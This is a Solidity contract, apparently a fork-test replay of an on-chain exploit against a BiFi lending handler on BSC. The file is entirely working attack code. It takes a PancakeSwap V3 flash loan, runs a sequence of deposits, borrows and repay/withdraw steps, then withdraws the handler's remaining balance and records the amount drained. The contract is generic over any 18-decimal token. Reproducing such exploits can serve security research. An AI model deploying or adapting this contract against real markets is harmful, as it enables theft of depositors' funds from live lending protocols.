// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20T {
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

interface IHandlerT {
    function deposit(uint256 unifiedTokenAmount, bool flag) external payable;
    function borrow(uint256 unifiedTokenAmount, bool flag) external;
    function withdraw(uint256 unifiedTokenAmount, bool flag) external;
    function repay(uint256 unifiedTokenAmount, bool flag) external payable;
}

interface IPancakeV3PoolT {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

/// @notice Generic fork-only replay of the BiFi idle-market interest-accrual exploit for any
/// 18-decimal token on BSC, flash-borrowing from a PancakeSwap V3 pool (0.01% fee).
/// Recipe (identical to the 2026-10-17 on-chain attack): tranche deposits -> 20 small borrows
/// -> 20 x (repay, withdraw) ratchet -> repay(max) -> withdraw the handler's remaining balance.
contract AttackTok {
    IERC20T public immutable token;
    IHandlerT public immutable handler;
    IPancakeV3PoolT public immutable pool;
    address public immutable owner;

    uint256 public constant N = 20;
    bool public isToken0;
    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public profit;
    uint256 public drained;

    constructor(address _token, address _handler, address _pool) {
        token = IERC20T(_token);
        handler = IHandlerT(_handler);
        pool = IPancakeV3PoolT(_pool);
        owner = msg.sender;
    }

    function run(uint256 amount) external {
        require(msg.sender == owner, "owner");
        flashAmount = amount;
        flashFee = amount * 100 / 1_000_000; // PancakeSwap V3 0.01% pool (fee() == 100)
        isToken0 = (IPancakeV3PoolT(pool).token0() == address(token));
        token.approve(address(handler), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        if (isToken0) {
            pool.flash(address(this), amount, 0, "");
        } else {
            pool.flash(address(this), 0, amount, "");
        }
        profit = token.balanceOf(address(this));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(msg.sender == address(pool), "pool");
        uint256 fee = isToken0 ? fee0 : fee1;
        require(fee == flashFee, "fee");
        uint256 a = flashAmount;

        uint256 d1 = a * 2995 / 1_000_000;
        uint256 d2 = a * 11964 / 1_000_000;
        uint256 d3 = a * 44327 / 1_000_000;
        uint256 d4 = a * 178736 / 1_000_000;
        handler.deposit(d1, false);
        handler.deposit(d2, false);
        handler.deposit(d3, false);
        handler.deposit(d4, false);
        handler.deposit(a - d1 - d2 - d3 - d4, false);
        handler.deposit(0, false);

        for (uint256 i = 0; i < N; i++) handler.borrow(a * 37 / 1000, false);

        for (uint256 i = 0; i < N; i++) {
            handler.repay(a * 37 / 1000, false);
            handler.withdraw(a * 5 / 100, false);
        }

        handler.repay(type(uint256).max, false);
        uint256 bal = token.balanceOf(address(handler));
        if (bal > 0) {
            uint256 b0 = token.balanceOf(address(this));
            try handler.withdraw(bal, false) {
                drained += token.balanceOf(address(this)) - b0;
            } catch {}
        }

        token.transfer(address(pool), a + fee);
    }
}
